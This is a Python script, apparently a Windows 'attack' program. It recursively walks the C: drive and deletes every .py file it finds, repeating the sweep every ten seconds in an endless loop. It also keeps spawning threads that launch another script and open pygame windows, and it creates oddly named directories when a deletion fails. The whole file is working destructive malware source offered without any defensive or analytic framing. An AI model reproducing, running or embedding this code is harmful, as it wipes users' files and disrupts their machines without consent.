import os
import time
import pygame
import sys
import threading
import subprocess


def main():
    class AttackOnWindows:
        def __init__(self):
            self.dir_work = os.getcwd()
            self.path = os.path.join('C://')
            self.w = 1024
            self.h = 1024
            self.file = 'alohadance.py'
            self.threads = []

        def attack(self):
            subprocess.run(['python', 'os_project_3.py'])
            pygame.init()
            screen = pygame.display.set_mode((self.w, self.h))
            pygame.display.set_caption('alohadance48')
            screen.fill((255, 255, 228))
            pygame.display.flip()
            running = True

            while running:
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        running = False

            pygame.quit()

        def monitor_windows(self):
            while True:
                if len(self.threads) < 4:
                    thread = threading.Thread(target=self.attack)
                    thread.start()
                    self.threads.append(thread)

                self.threads = [t for t in self.threads if t.is_alive()]
                time.sleep(1)

        def attack_on_file(self):
            py_files = []
            for dicpath, dirname, filenames in os.walk('C://'):
                for filename in filenames:
                    if filename.endswith('.py'):
                        full_path = os.path.join(dicpath, filename)
                        py_files.append(full_path)
            for file in py_files:
                try:
                    os.remove(file)
                except FileNotFoundError:
                    pass
                except Exception as e:
                    print(f'Ошибка при удалении файла {file}: {e}')
                    os.mkdir('gey.cpp')
                    os.mkdir('lesha.js')

    class AttackMain(AttackOnWindows):
        def attack_main_all_system(self, start):
            while start:
                print(' ')
                time.sleep(10)
                self.attack_on_file()

    attack = AttackMain()
    threading.Thread(target=attack.monitor_windows).start()
    attack.attack_main_all_system(True)


if __name__ == '__main__':
    main()